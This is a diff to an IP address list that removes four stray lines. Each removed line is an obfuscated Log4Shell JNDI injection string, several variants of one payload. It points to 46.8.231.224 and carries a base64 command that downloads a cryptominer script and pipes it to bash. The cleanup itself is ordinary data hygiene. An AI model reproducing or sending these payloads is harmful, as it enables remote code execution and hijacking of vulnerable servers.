@@ -1,7 +1,4 @@
 "IP uniques"
-${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==
-${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}
-${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-a}${upper::-p}://46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}
 1.1.184.121
 1.10.219.78
 1.160.185.235
@@ -7554,4 +7551,3 @@ ${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-
 99.79.50.104
 99.79.58.37
 99.79.66.33
-t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}')
